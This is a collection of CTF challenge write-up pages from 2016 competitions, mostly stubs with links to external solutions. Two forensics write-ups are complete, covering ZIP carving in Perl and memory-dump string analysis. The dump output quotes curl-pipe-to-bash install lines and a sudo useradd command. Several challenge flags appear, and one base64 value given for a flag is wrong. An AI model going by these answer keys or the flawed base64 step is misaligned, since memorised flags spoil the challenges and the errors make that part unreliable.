(TODO)

## Other write-ups and resources

* <https://forum.xeksec.com/f25/t88611/?langid=1>
* <https://ctftime.org/writeup/2402>
* <https://github.com/p4-team/ctf/tree/master/2016-02-05-sharif/web_400_hackme>
* <https://github.com/raccoons-team/ctf/tree/master/2016-02-06-su-ctf/web-hackme-400>
* [Spanish](https://blog.ka0labs.net/post/29/)
# Sharif University CTF 2016 : oldpersian

**Category:** Web
**Points:** 250
**Solves:** 11
**Description:**

> Old persian cuneiform captcha
> 
> Old Persian cuneiform is a semi-alphabetic cuneiform script that was the primary script for the old persian language. You could get more information on following links, 
> 
> 1- <http://www.ancientscripts.com/oldpersian.html> 
> 
> 2- <https://en.wikipedia.org/wiki/Old_Persian_cuneiform.> 
> 
> 
> A web-based collections management for a museum has some extremely valuable information if one has admin user access. 
> 
> The Site <http://ctf.sharif.edu:32455/chal/oldpersian/06b8d37b5c6303fd/>
> 
> 
> We found that the "admin" user have a 4-digit password. But they use a captcha made of 10 old persian characters. One has to use the correspondence between symbols and strings to pass theye captcha verification (use "[trans.png](./trans.png)"). 
> 
> Log in as "admin" to find the flag.
> 
> Download [trans.png](./trans.png)


## Write-up

(TODO)

## Other write-ups and resources

* <https://github.com/Execut3/CTF/tree/master/Participated-CTF/2016/SharifCTF/Web3-oldpersian>
* <http://gnoobz.com/sharif-ctf-2016-web-250-oldpersian.html>
* <http://pastebin.com/csnbyaku>
* <https://0x90r00t.com/2016/02/07/sharif-university-ctf-2016-web-250-old-persian-cuneiform-captcha-write-up/>
# Sharif University CTF 2016 : PhotoBlog

**Category:** Web
**Points:** 100
**Solves:** 98
**Description:**

> A friend of mine have stolen my cat's picture on his blog. I want to login as admin user on his blog. Do you have any idea? The Blog <http://ctf.sharif.edu:33455/chal/PhotoBlog/c2f1204f357ce900/>


## Write-up

(TODO)

## Other write-ups and resources

* <https://ctftime.org/writeup/2395>
* <https://github.com/tuvshuud/1up/blob/master/SharifCTF2016/photoblog100/README.md>
* <https://github.com/QuokkaLight/write-ups/blob/master/sharif-university-ctf-2016/web/PhotoBlog.md>
* <http://err0r-451.ru/sharifctf-web-photoblog-100pts/>
# Sharif University CTF 2016 : technews

**Category:** Web
**Points:** 200
**Solves:** 24
**Description:**

> Can you find the flag? The Blog <http://ctf.sharif.edu:31455/chal/technews/2e5ea7a69acf44f9/>


## Write-up

(TODO)

## Other write-ups and resources

* <https://ctftime.org/writeup/2404>
* [Spanish](https://blog.ka0labs.net/post/28/)
# Sunshine CTF CTF 2016 : Alligatorsim95

**Category:** Exploitation
**Points:** 50
**Solves:** ?
**Description:**

> Description: nc 4.31.182.242 9000
> 
> 
> Service: 4.31.182.242:9000


## Write-up

<TODO>

## Other write-ups and resources

* <http://err0r-451.ru/sunctf-exploitation-alligatorsim95-50pts/>
* <https://github.com/d0tslashpwn/write-ups/blob/master/Sunshine-CTF-2016/write-ups/alligatorsim95.md>
# Sunshine CTF CTF 2016 : dance

**Category:** Exploitation
**Points:** 55
**Solves:** ?
**Description:**

> Description: nc 4.31.182.242 9001
> 
> 
> Service: 4.31.182.242:9001


## Write-up

<TODO>

## Other write-ups and resources

* <http://tylerhalfpop.com/2016/03/12/blog-BSidesOrlando-CTF-Exploit-Dance.html>
* <https://github.com/d0tslashpwn/write-ups/blob/master/Sunshine-CTF-2016/write-ups/dance.md>
# Sunshine CTF CTF 2016 : flirtatiousGator

**Category:** Exploitation
**Points:** 300
**Solves:** ?
**Description:**

> Description: jump on that gator. below file running at
> 
> nc 4.31.182.242 9003
> 
> flag is in "/home/arr/flag"
> 
> 
> Service: 4.31.182.242:9003


## Write-up

<TODO>

## Other write-ups and resources

* <https://github.com/TeamBP/write-ups/tree/master/2016/sunshine-ctf/FlirtatiousGator>
# Sunshine CTF 2016 : randy

**Category:** Exploitation
**Points:** 100
**Solves:** ?
**Description:**

> Description: 
> 
> 
> Attachment: [randy-noflag](./randy-noflag)
> 
> 
> Service: 4.31.182.242:9002


## Write-up

<TODO>

## Other write-ups and resources

* <https://github.com/EspacioTeam/write-ups/tree/master/2016/sunshine/Randy>
* <https://github.com/d0tslashpwn/write-ups/blob/master/Sunshine-CTF-2016/write-ups/randy.md>
# Sunshine CTF 2016 : Butterfly effect

**Category:** Forensics
**Points:** 50
**Solves:** ?
**Description:**

> Description: http://ctf.bsidesorlando.org/static/uploads/5676ebc69d9abdf9df4a39728f558100/butterfly.png 
> 

## Write-up

<TODO>

## Other write-ups and resources

* <https://0day.work/sunshine-ctf-2016-writeups/#butterflyeffect>
* <http://err0r-451.ru/2016-sunctf-butterfly-effect-50-pts/>
* <https://github.com/tsunnyday/ctf-writeups/tree/master/SunshineCTF_2016/butterfly_effect>
* <https://github.com/d0tslashpwn/write-ups/blob/master/Sunshine-CTF-2016/write-ups/butterfly_effect.md>
* <https://github.com/MrMugiwara/WriteupsCTF/tree/master/SunshineCTF2016/%20Butterfly%20-%20Forensic%2050>
# Sunshine CTF 2016 : Get gud kid

**Category:** Forensics
**Points:** 300
**Solves:** ?
**Description:**

> Description: http://ctf.bsidesorlando.org/static/uploads/213d461c72e1db462eb6e54c612f3fcf/moon.png
> 

## Write-up

We are presented with a file containing several (corrupt) ZIP files that contain JPEG images. Using file carving methods we can extract seven cat pictures but there's nothing in those pictures. During the CTF a hint was released that we have to look between the structs, so I started to dump the locations of the ZIP headers.

A nice overview and explanation of the different ZIP files can, of course, be found on [Wikipedia](https://en.wikipedia.org/wiki/Zip_%28file_format%29#Design). In short, we got a local file header before each file in the ZIP archive, we got the central directory header header containing a list of all files and behind it we got the end of central directory header.

```perl
use strict;
use warnings;

open(F, '<', 'get_gud_kid.dat');

my $magic_local_file = "\x50\x4b\x03\x04";
my $magic_central_dir = "\x50\x4b\x01\x02";
my $magic_end = "\x50\x4b\x05\x06";
my @window = (0, 0, 0, 0);
my $bytes_read = 0;

while(read(F, my $char, 1)) {
    shift @window; push @window, $char;
    if(("\xff" eq $window[1] && "\xd8" eq $window[2])) {
        print "JPG STARTS \@ $bytes_read...\n";
    }
    if(("\xff" eq $window[1] && "\xd9" eq $window[2])) {
        print "JPG ENDS \@ $bytes_read...\n";
    }

    if($magic_local_file eq join('', @window)) {
        print "Found local file header \@ $bytes_read...\n";
    } elsif($magic_central_dir eq join('', @window)) {
        print "Found central dir \@ $bytes_read...\n";
    } elsif($magic_end eq join('', @window)) {
        print "Found End of central dir \@ $bytes_read...\n";
    } elsif('flag' eq join('', @window)) {
        print "Found keyword: 'flag'\n";
    }

    $bytes_read++;
}

close(F);
```

```bash
$ perl get_gud.pl
Found local file header @ 182...
JPG STARTS @ 219...
JPG ENDS @ 368678...
Found central dir @ 368681...
Found End of central dir @ 368735...
Found local file header @ 368757...
Found local file header @ 368778...
JPG STARTS @ 368815...
JPG ENDS @ 779040...
Found central dir @ 779043...
Found End of central dir @ 779097...
Found keyword: 'flag'
Found local file header @ 779140...
JPG STARTS @ 779177...
JPG ENDS @ 928404...
Found central dir @ 928407...
Found End of central dir @ 928461...
Found local file header @ 928504...
JPG STARTS @ 928541...
JPG ENDS @ 1545705...
Found central dir @ 1545708...
Found End of central dir @ 1545762...
Found central dir @ 1545791...
Found local file header @ 1545805...
JPG STARTS @ 1545842...
JPG ENDS @ 1921240...
Found central dir @ 1921243...
Found End of central dir @ 1921297...
Found local file header @ 1921340...
JPG STARTS @ 1921377...
JPG ENDS @ 2282642...
Found central dir @ 2282645...
Found End of central dir @ 2282699...
Found keyword: 'flag'
Found local file header @ 2282742...
JPG STARTS @ 2282779...
JPG ENDS @ 2792046...
Found central dir @ 2792049...
Found End of central dir @ 2792103...
Found End of central dir @ 2792126...
```

Because of the hint, I dumped all bytes from the End of Central Directory header until the local file header as those bytes seemed most promising. (Notice the keyword "flag" appearing a few times between those two headers).

```perl
use strict;
use warnings;

open(F, '<', 'get_gud_kid.dat');

my $magic_local_file = "\x50\x4b\x03\x04";
my $magic_central_dir = "\x50\x4b\x01\x02";
my $magic_end = "\x50\x4b\x05\x06";
my @window = (0, 0, 0, 0);
my $bytes_read = 0;

my $between_eocd_lfh = 0;

while(read(F, my $char, 1)) {
        shift @window; push @window, $char;
        print $char if $between_eocd_lfh;

        if($magic_local_file eq join('', @window)) {
                $between_eocd_lfh = 0;
        } elsif($magic_end eq join('', @window)) {
                print join('', @window); # Also print the magic bytes
                $between_eocd_lfh = 1;
        }

        $bytes_read++;
}


close(F);
```

```
perl get_gud.pl | xxd
00000000: 504b 0506 0000 0000 0100 0100 3600 0000  PK..........6...
00000010: 739f 0500 0000 504b 0304 504b 0506 0000  s.....PK..PK....
00000020: 0000 0100 0100 3600 0000 9942 0600 0000  ......6....B....
00000030: 001d 0000 000b 0000 0066 6c61 6767 6564  .........flagged
00000040: 2e74 7874 6350 4b03 0450 4b05 0600 0000  .txtcPK..PK.....
00000050: 0001 0001 0036 0000 0013 4702 0000 0033  .....6....G....3
00000060: 5675 6532 6431 4d33 4e7a 5833 5666 5a7a  Vue2d1M3NzX3VfZz
00000070: 4230 5832 504b 0304 504b 0506 0000 0000  B0X2PK..PK......
00000080: 0100 0100 3600 0000 f46a 0900 0000 6431  ....6....j....d1
00000090: 5a48 303d 0a50 4b01 0214 0014 0000 0000  ZH0=.PK.........
000000a0: 002f 8750 4b03 0450 4b05 0600 0000 0001  ./.PK..PK.......
000000b0: 0001 0036 0000 008e ba05 0000 0066 48ee  ...6.........fH.
000000c0: c8ee f11d 0000 001d 0000 000b 0000 0000  ................
000000d0: 0000 504b 0304 504b 0506 0000 0000 0100  ..PK..PK........
000000e0: 0100 3600 0000 5983 0500 0000 0000 0000  ..6...Y.........
000000f0: 00b6 8100 0000 0066 6c61 6767 6564 2e74  .......flagged.t
00000100: 7850 4b03 0450 4b05 0600 0000 0001 0001  xPK..PK.........
00000110: 0036 0000 007b c507 0000 0074 504b 0506  .6...{.....tPK..
00000120: 504b 0506 0000 0000 0100 0100 3900 0000  PK..........9...
00000130: 4600 0000 0000                           F.....
```

We can see some strings resembling base64. Let's add the two big ones together: "3Vue2d1M3NzX3VfZzB0X2d1ZH0=". Decoding:
```
$ perl -MMIME::Base64 -le 'print decode_base64("3Vue2d1M3NzX3VfZzB0X2d1ZH0=")'
?[???L????W????Y
<TODl>
``` 

Let's try adding the 'G' just before the '3':
```
$ perl -MMIME::Base64 -le 'print decode_base64("G3Vue2d1M3NzX3VfZzB0X2d1ZH0=")'
n{gu3ss_u_g0t_gud}
```

So: sun{gu3ss_u_g0t_gud} (which is "c3Vue2d1M3NzX3VfZzd1ZH0=" in base64)

Note: For some reason, submitting the flag during the CTF failed but I'm pretty sure this is the answer.


## Other write-ups and resources

None.
# Sunshine CTF 2016 : That's no moon

**Category:** Forensics
**Points:** 50
**Solves:** ?
**Description:**

> Description: http://ctf.bsidesorlando.org/static/uploads/213d461c72e1db462eb6e54c612f3fcf/moon.png
> 

## Write-up

<TODO>

## Other write-ups and resources

* <https://github.com/d0tslashpwn/write-ups/blob/master/Sunshine-CTF-2016/write-ups/thats_no_moon.md>
* <https://github.com/tsunnyday/ctf-writeups/tree/master/SunshineCTF_2016/moon>
* <http://err0r-451.ru/2016-sunctf-forensics-thats-no-moon-50-pts/>
* <https://0day.work/sunshine-ctf-2016-writeups/#thatsnomoon>
# Sunshine CTF 2016 : Where is florida man

**Category:** Forensics
**Points:** 400
**Solves:** ?
**Description:**

> Description: 
> 

## Write-up

Unzipping the file we're given and running file:
```bash
[fagrant@ctf ~]$ file whereisfloridaman 
whereisfloridaman: DOS/MBR boot sector MS-MBR Windows 7 english at offset 0x163 "Invalid partition table" at offset 0x17b "Error loading operating system" at offset 0x19a "Missing operating system", disk signature 0x4030201
```

After some manual looking around in a hexdump tool, I decided to retrieve all MFT entries:
```
$ vol.py -f whereisfloridaman mftparser --output-file=huehue.txt 
```

Between all the entries, we get the following two:
```
MFT entry found at offset 0x3d619908
Attribute: In Use & File
Record Number: 35
Link count: 2

$STANDARD_INFORMATION
Creation                       Modified                       MFT Altered                    Access Date                    Type
------------------------------ ------------------------------ ------------------------------ ------------------------------ ----
2016-03-11 01:52:26 UTC+0000 2016-03-11 01:52:26 UTC+0000   2016-03-11 01:52:26 UTC+0000   2016-03-11 01:52:26 UTC+0000   Archive

$FILE_NAME
Creation                       Modified                       MFT Altered                    Access Date                    Name/Path
------------------------------ ------------------------------ ------------------------------ ------------------------------ ---------
2016-03-11 01:52:26 UTC+0000 2016-03-11 01:52:26 UTC+0000   2016-03-11 01:52:26 UTC+0000   2016-03-11 01:52:26 UTC+0000   FL<E9><97><9A>RID~1.7Z

$FILE_NAME
Creation                       Modified                       MFT Altered                    Access Date                    Name/Path
------------------------------ ------------------------------ ------------------------------ ------------------------------ ---------
2016-03-11 01:52:26 UTC+0000 2016-03-11 01:52:26 UTC+0000   2016-03-11 01:52:26 UTC+0000   2016-03-11 01:52:26 UTC+0000   floridadump.7z

$DATA

$OBJECT_ID
Object ID: 40000000-0000-0000-0050-110500000000
Birth Volume ID: 00000000-0000-0000-0000-000000000000
Birth Object ID: 2215512d-0a00-ffff-ffff-ffff82794711
Birth Domain ID: 5b0f8000-0000-0000-160f-800000000000

***************************************************************************
***************************************************************************
MFT entry found at offset 0x40092c00
Attribute: In Use & File
Record Number: 35
Link count: 2

$STANDARD_INFORMATION
Creation                       Modified                       MFT Altered                    Access Date                    Type
------------------------------ ------------------------------ ------------------------------ ------------------------------ ----
2016-03-11 01:52:26 UTC+0000 2016-03-11 01:29:41 UTC+0000   2016-03-11 01:52:26 UTC+0000   2016-03-11 01:52:26 UTC+0000   Archive

$FILE_NAME
Creation                       Modified                       MFT Altered                    Access Date                    Name/Path
------------------------------ ------------------------------ ------------------------------ ------------------------------ ---------
2016-03-11 01:52:26 UTC+0000 2016-03-11 01:52:26 UTC+0000   2016-03-11 01:52:26 UTC+0000   2016-03-11 01:52:26 UTC+0000   FLORID~1.7Z

$FILE_NAME
Creation                       Modified                       MFT Altered                    Access Date                    Name/Path
------------------------------ ------------------------------ ------------------------------ ------------------------------ ---------
2016-03-11 01:52:26 UTC+0000 2016-03-11 01:52:26 UTC+0000   2016-03-11 01:52:26 UTC+0000   2016-03-11 01:52:26 UTC+0000   floridadump.7z

$DATA

$OBJECT_ID
Object ID: 40000000-0000-0000-0050-110500000000
Birth Volume ID: db401105-0000-0000-db40-110500000000
Birth Object ID: 2215512d-0a00-ffff-ffff-ffff82794711
Birth Domain ID: 00000000-0000-0000-0000-000000000000

***************************************************************************
***************************************************************************
```

So, we probably should extract this archive. I carved it out using foremost.

Trying to extract the archive prompts us for a password:
```
[fagrant@ctf ~]$ 7z e 00021944.7z

7-Zip [64] 9.38 beta  Copyright (c) 1999-2014 Igor Pavlov  2015-01-03
p7zip Version 9.38.1 (locale=C,Utf16=off,HugeFiles=on,1 CPU,ASM)

Processing archive: 00021944.7z

Enter password (will not be echoed) :

Error: Can not open encrypted archive. Wrong password?

Can't open as archive: 1
Files: 0
Size:       0
Compressed: 0
```

We also notice some text files named 001.txt, ..., 007.txt:
```
***************************************************************************
MFT entry found at offset 0x40093400
Attribute: In Use & File
Record Number: 37
Link count: 1


$STANDARD_INFORMATION
Creation                       Modified                       MFT Altered                    Access Date                    Type
------------------------------ ------------------------------ ------------------------------ ------------------------------ ----
2016-03-11 01:52:38 UTC+0000 2016-03-11 01:16:22 UTC+0000   2016-03-11 01:52:38 UTC+0000   2016-03-11 01:52:38 UTC+0000   Archive

$FILE_NAME
Creation                       Modified                       MFT Altered                    Access Date                    Name/Path
------------------------------ ------------------------------ ------------------------------ ------------------------------ ---------
2016-03-11 01:52:38 UTC+0000 2016-03-11 01:52:38 UTC+0000   2016-03-11 01:52:38 UTC+0000   2016-03-11 01:52:38 UTC+0000   007.txt

$DATA


$OBJECT_ID
Object ID: 40000000-0000-0000-00a0-020000000000
Birth Volume ID: 99960200-0000-0000-9996-020000000000
Birth Object ID: 312af3f6-0300-ffff-8000-000058000000
Birth Domain ID: 000f1800-0000-0300-1a00-000038000000

***************************************************************************

```

```perl
use strict;
use warnings;

open(F, '<', 'whereisfloridaman');
seek(F, 0x40093400, 0);
my $i = 0;
while($i < 500) {
    my $line;
    read(F, $line, 1000);
    print $line;
    $i++;
}
close(F);
```

Looking through the output I find the following interesting MFT entry:
```
00000c00: 4649 4c45 3000 0300 d01c 8000 0000 0000 0100 0100 3800 0100 0002 0000 0004 0000  FILE0...............8...........
00000c20: 0000 0000 0000 0000 0500 0000 2800 0000 0700 4711 0000 0000 1000 0000 6000 0000  ............(.....G.........`...
00000c40: 0000 0000 0000 0000 4800 0000 1800 0000 3e74 edb0 387b d101 2fa9 61bb 357b d101  ........H.......>t..8{../.a.5{..
00000c60: 5f98 f4b0 387b d101 3e74 edb0 387b d101 2000 0000 0000 0000 0000 0000 0000 0000  _...8{..>t..8{.. ...............
00000c80: 0000 0000 0501 0000 0000 0000 0000 0000 0000 0000 0000 0000 3000 0000 6800 0000  ........................0...h...
00000ca0: 0000 0000 0000 0200 5000 0000 1800 0100 0500 0000 0000 0500 3e74 edb0 387b d101  ........P...............>t..8{..
00000cc0: 3e74 edb0 387b d101 3e74 edb0 387b d101 3e74 edb0 387b d101 0000 0100 0000 0000  >t..8{..>t..8{..>t..8{..........
00000ce0: 0000 0000 0000 0000 2000 0000 0000 0000 0703 3000 3000 3300 2e00 7400 7800 7400  ........ .........0.0.3...t.x.t.
00000d00: 8000 0000 4800 0000 0100 0000 0000 0100 0000 0000 0000 0000 0f00 0000 0000 0000  ....H...........................
00000d20: 4000 0000 0000 0000 0000 0100 0000 0000 05f2 0000 0000 0000 05f2 0000 0000 0000  @...............................
00000d40: 3110 c2f7 0300 ffff 8000 0000 5800 0000 0008 1800 0000 0300 2d00 0000 2800 0000  1...........X...........-...(...
00000d60: 6300 6e00 6600 6600 6a00 6200 6500 7100 224e 325a 4457 5734 3758 4b59 3858 3654  c.n.f.f.j.b.e.q."N2ZDWW47XKY8X6T
00000d80: 4c55 5450 5236 5134 4437 3652 4855 3745 4e56 4350 4138 4356 4b22 200d 0a00 0000  LUTPR6Q4D76RHU7ENVCPA8CVK" .....
00000da0: 8000 0000 5800 0000 000f 1800 0000 0400 1a00 0000 3800 0000 5a00 6f00 6e00 6500  ....X...............8...Z.o.n.e.
00000dc0: 2e00 4900 6400 6500 6e00 7400 6900 6600 6900 6500 7200 0000 5b5a 6f6e 6554 7261  ..I.d.e.n.t.i.f.i.e.r...[ZoneTra
00000de0: 6e73 6665 725d 0d0a 5a6f 6e65 4964 3d33 0d0a 0000 0000 0000 ffff ffff 8279 0700  nsfer]..ZoneId=3.............y..
```

Note that I knew that small files have their contents in the MFT, which gave me some interest in the MFT entries. 

Trying the string N2ZDWW47XKY8X6TLUTPR6Q4D76RHU7ENVCPA8CVK" for the 7z password worked. We now have the file `floridadump`.
```
[fagrant@ctf ~]$ ls -alh floridadump 
-r--r--r-- 1 fagrant admin 512M Mar  6 04:05 floridadump
[fagrant@ctf ~]$ file floridadump 
floridadump: data
[fagrant@ctf ~]$ xxd -c32 floridadump | head
00000000: 454d 694c 0100 0000 0010 0000 0000 0000 fffb 0900 0000 0000 0000 0000 0000 0000  EMiL............................
00000020: 0000 0000 0000 0000 0000 0000 0000 0000 0000 0000 0000 0000 0000 0000 0000 0000  ................................
00000040: 0000 0000 0000 0000 0000 0000 0000 0000 0000 0000 0000 0000 0000 0000 0000 0000  ................................
00000060: 0000 0000 0000 0000 0000 0000 0000 0000 0000 0000 0000 0000 0000 0000 0000 0000  ................................
00000080: 0000 0000 0000 0000 0000 0000 0000 0000 0000 0000 0000 0000 0000 0000 0000 0000  ................................
000000a0: 0000 0000 0000 0000 0000 0000 0000 0000 0000 0000 0000 0000 0000 0000 0000 0000  ................................
000000c0: 0000 0000 0000 0000 0000 0000 0000 0000 0000 0000 0000 0000 0000 0000 0000 0000  ................................
000000e0: 0000 0000 0000 0000 0000 0000 0000 0000 0000 0000 0000 0000 0000 0000 0000 0000  ................................
00000100: 0000 0000 0000 0000 0000 0000 0000 0000 0000 0000 0000 0000 0000 0000 0000 0000  ................................
00000120: 0000 0000 0000 0000 0000 0000 0000 0000 0000 0000 0000 0000 0000 0000 0000 0000  ................................
```

Looking online for the magic bytes EMiL, I found the following: https://github.com/504ensicsLabs/LiME

But it appeared to not really be relevant to this case. The only thing we need to know is that we're dealing with a memdump.

Looking for interesting strings, I searched for 'florida' and found strings related to a user 'floridaman'. Dumping all "shell commands" with a dump regex:
```
[fagrant@ctf ~]$ strings -n10 floridadump | grep 'floridaman@' | sort | uniq       
[Kfloridaman@floridaman: ~/LiME/src
]0;floridaman@floridaman: /usr/share
]0;floridaman@floridaman: ~
]0;floridaman@floridaman: ~/LiME
]0;floridaman@floridaman: ~/LiME/src
floridaman@floridaman: ~
floridaman@floridaman: ~/LiME
floridaman@floridaman: ~/LiME/src
floridaman@floridaman:/$ cd usr
floridaman@floridaman:/usr/share$ ls
floridaman@floridaman:~$ 
floridaman@floridaman:~$ cd LiME
floridaman@floridaman:~$ ls
floridaman@floridaman:~$ ls -al
floridaman@floridaman:~$ nano .bash_history
floridaman@floridaman:~$ t.rvm.io | bash -s stable --ruby
floridaman@floridaman:~/LiME$ cd src
floridaman@floridaman:~/LiME$ ls
floridaman@floridaman:~/LiME/src$ 
floridaman@floridaman:~/LiME/src$   
floridaman@floridaman:~/LiME/src$ .order    tcp.c
floridaman@floridaman:~/LiME/src$ l
floridaman@floridaman:~/LiME/src$ ls
floridaman@floridaman:~/LiME/src$ s.order    tcp.ce.symvers  tcp.o
floridaman@floridaman:~/LiME/src$ sudo insmod ./lime-3.19.0-25-gena
floridaman@floridaman:~/LiME/src$ sudo insmod ./lime-3.19.0-25-generic.ko "path=/home/floridaman/floridadump.lime format=lime
floridaman@floridaman:~/LiME/src$ sudo insmod ./lime-3.19.0-25-generic.ko "path=/home/floridaman/floridadump.lime format=lime"
```

Looking for sudo commands doesn't seem like a bad idea either:
```
[fagrant@ctf ~]$ strings -n10 floridadump | grep -E '.+sudo ' | sort | uniq
    ${SUDO_USER:+sudo }${rvm_gpg_command##*/} --keyserver hkp://keys.gnupg.net --recv-keys 409B6B1796C275462A1703113804BB82D39DC0E3
    command curl -sSL https://rvm.io/mpapis.asc | ${SUDO_USER:+sudo }${rvm_gpg_command##*/} --import -
 package using apt-get.  This feature requires apt and sudo to work.
# Allow members of group sudo to execute any command
# Finally, please note that using the visudo command is the recommended way
# See the man page for visudo for more information.
# This will cause sudo to read and parse any files in the /etc/sudoers.d 
%s is not allowed to run sudo on %s.  This incident will be reported.
Allow sudo to prompt for a password even if it would be visible
Always send mail when sudo is run
File containing the sudo lecture: %s
If sudo is invoked with no arguments, start a shell
Only allow the user to run sudo if they have a tty
Please run ibus-daemon with login user! Do not run ibus-daemon with sudo or su.
Sorry, user %s may not run sudo on %s.
Use `sudo ./%s' if this is the `%s' you wish to run.
User %s is not allowed to run sudo on %s.
Visudo will honor the EDITOR environment variable
[11;1Hsudo pip install peewee
[12dsudo useradd -p $(openssl passwd -1 $THING) floridawoman
[16dsudo apt-get update
[17dsudo rm -rf /var/lib/apt/lists/*
[18dsudo apt-get install htop
[18dsudo apt-get update
command_to_run=(__rvm_sudo -p "%p password required for '$*': " "${command_to_run[@]}")
effective uid is not %d, is sudo installed setuid root?
floridaman@floridaman:~/LiME/src$ sudo insmod ./lime-3.19.0-25-gena
floridaman@floridaman:~/LiME/src$ sudo insmod ./lime-3.19.0-25-generic.ko "path=/home/floridaman/floridadump.lime format=lime
floridaman@floridaman:~/LiME/src$ sudo insmod ./lime-3.19.0-25-generic.ko "path=/home/floridaman/floridadump.lime format=lime"
```

Between the commands we see an openssl command with an environment variable:
```
[fagrant@ctf ~]$ strings -n10 floridadump | grep -E 'THING' | sort | uniq
!g_type_info_is_pointer (type_info) || transfer == GI_TRANSFER_NOTHING
(%lu) NOTHING
(?) NOTHING
-   5   5   1396975204  A   -   -   gz  How to write mib2c.conf files to do ANYTHING based on MIB input.
EVERYTHING
[11;1Hexport THING="c3Vue0YhTjRMTFlfQzRVR0hUX0ZMMFIhRDRNNE59"
[12dsudo useradd -p $(openssl passwd -1 $THING) floridawoman
arg_cache->transfer == GI_TRANSFER_NOTHING
export THING="c3Vue0YhTjRMTFlfQzRVR0hUX0ZMMFIhRDRNNE59"
g_type_is_a (g_type, G_TYPE_VARIANT) || !is_pointer || transfer == GI_TRANSFER_NOTHING
sudo useradd -p $(openssl passwd -1 $THING) floridawoman
transfer == GI_TRANSFER_NOTHING
```

Base64 decode of the contents:
```
[fagrant@ctf ~]$ echo "c3Vue0YhTjRMTFlfQzRVR0hUX0ZMMFIhRDRNNE59" | base64 --decode
sun{F!N4LLY_C4UGHT_FL0R!D4M4N}
```


## Other write-ups and resources
* <https://ctftime.org/writeup/2834>
# Sunshine CTF 2016 : floridaman

**Category:** misc
**Points:** 50
**Solves:** ?
**Description:**

> Description: In other news… Floridaman did what with an alligator?
> Remember, this has the normal flag format. 
> 

## Write-up

<TODO>

## Other write-ups and resources

* <http://err0r-451.ru/sunctf-misc-floridaman-50-pts/>
* <https://github.com/d0tslashpwn/write-ups/blob/master/Sunshine-CTF-2016/write-ups/find_floridaman.md>
* <https://ctftime.org/writeup/2858>
* <https://ctftime.org/writeup/2834>

# Sunshine CTF 2016 : Short message service is short

**Category:** misc
**Points:** 200
**Solves:** ?
**Description:**

> Description: 
> 
>  

## Write-up

<TODO>

## Other write-ups and resources

# Sunshine CTF 2016 : worth

**Category:** misc
**Points:** 300
**Solves:** ?
**Description:**

> Description: 
> 
> 

## Write-up

<TODO>

## Other write-ups and resources

* <https://ctftime.org/writeup/2881>

# Sunshine CTF 2016 write-ups

* <http://ctf.bsidesorlando.org/>
* [Scoreboard](http://ctf.bsidesorlando.org/scoreboard) or [local alternative](scoreboard)

## Completed write-ups

* [forensics/get-gud-kid-300](forensics/get-gud-kid-300)
* [forensics/where-is-floridaman-400](forensics/where-is-floridaman-400)

## External write-ups only

* [misc/worth-300](misc/worth-300)
* [exploitation/flirtatiousGator-300](exploitation/flirtatiousGator-300)
* [exploitation/randy-100](exploitation/randy-100)
* [exploitation/alligatorsim95-50](exploitation/alligatorsim95-50)
* [exploitation/dance-55](exploitation/dance-55)
* [forensics/butterfly-effect-50](forensics/butterfly-effect-50)
* [forensics/thats-no-moon-50](forensics/thats-no-moon-50)
* [misc/floridaman-50](misc/floridaman-50)

## Missing write-ups

* [misc/short-message-service-is-short-200](misc/short-message-service-is-short-200)

There were also two recon challenges.
# Teaser CONFidence CTF 2016 : amazeing-200

**Category:** Ppc
**Points:** 200
**Solves:** 16
**Description:**

Hi!. let's play old nes game. I just plugged this stuff to tcp ports for ya ...
IP: amazeing.hackable.software

![img](/img.png)

## Write-up

(TODO)

## Other write-ups and resources

* https://github.com/p4-team/ctf/tree/master/2016-04-14-confidence-teaser/network_ppc_amazeing
# Teaser CONFidence CTF 2016 : gobox

**Category:** Pwn
**Points:** 
**Solves:** 
**Description:**



## Write-up

(TODO)

## Other write-ups and resources

* http://disconnect3d.pl/teaser-confidence-ctf-2016-pwn-gobox-2/
# Teaser CONFidence CTF 2016 write-ups

* <TODO>
* [Scoreboard](TODO) or [local alternative](scoreboard)

## Repo-local write-ups

* none yet

## External write-ups only

* [pwn/gobox](pwn/gobox)
* [ppc/amazeing-200](ppc/amazeing-200)
* [web/rofl-scale-100](web/rofl-scale-100)

## Missing write-ups

* none yet
# Teaser CONFidence CTF 2016 : rofl-scale-100

**Category:** Web
**Points:** 100
**Solves:** 
**Description:**

Admins connected a debug interface to our Roflscale DB. They didn’t bother to secure it with a password, so we put in a proxy instead.

IP: roflscale.hackable.software:4000

## Write-up

(TODO)

## Other write-ups and resources

* http://security.szurek.pl/confidence-ds-ctf-2016-roflscale-writeup.html
* https://tsublogs.wordpress.com/2016/04/15/teaser-confidence-ctf-2016-roflscale-web-100/
# tjctf-2016 : cipher-font-50

**Category:** Web**Points:** 50
**Description:** This webpage contains a flag!

## Write-up

By attempting to copy and paste the text displayed on the webpage, it is obvious the displayed characters are not the true text of the page. However, upon closer inspection, each displayed character represents a single text character. For example, the actual character '(' is - as a result of the font - displayed as a 'w'. Following the same pattern, the actual character '[' is displayed as 'L'. The fastest  way to decrypt this large chunk of text would be to write a program that substitutes characters from the copied text to the character they display as. Pasting the text from the page into the program and having it substitute characters would produce you with a string identical to that which is displayed on the challenge's web page. Then, before your program ends, have it print out that new string hashed with MD5. Last, surround that hash value with the traditional tjctf{} format and you will end up with `tjctf{232bd3180db2e7261ad2d94b725c9008}`

## Other write-ups and resources

* [MilWestA - CTFtime.org](https://ctftime.org/writeup/3451)
* [My Computer is a Potato - gitbooks.io](https://bobacadodl.gitbooks.io/tjctf-2016-writeups/content/cipher_font_50_pts.html)
# tjctf-2016 : curvature-200

**Category:** Cryptography
**Points:** 200
**Description:** curvature2.py

## Write-up

(TODO)
`tjctf{oops_ell1pt1c_curves_R_h4rd}``

## Other write-ups and resources

* [My Computer is a Potato - gitbooks.io](https://bobacadodl.gitbooks.io/tjctf-2016-writeups/content/curvature2_200_pts.html)
# tjctf-2016 : financial-transaction-60

**Category:** Cryptography**Points:** 60
**Description:** The History Museum sent us some money and encrypted the transfer using an Enigma Machine. Unfortunately, we were unable to decrypt the cipher and retrieve the money. Can you help us out? This is all we have.

## Write-up

(TODO)
`tjctf{MONEYISNOTEVERYTHING}`

## Other write-ups and resources

* [My Computer is a Potato - gitbooks.io](https://bobacadodl.gitbooks.io/tjctf-2016-writeups/content/financial_transaction_50_pts.html)
# tjctf-2016 : one-time-subtraction-20

**Category:** Cryptography**Points:** 20
**Description:** I encrypted this flag with a one time subtraction, but my friend says it's not secure because my key is only one byte. Can you check if this is secure?

## Write-up

(TODO)
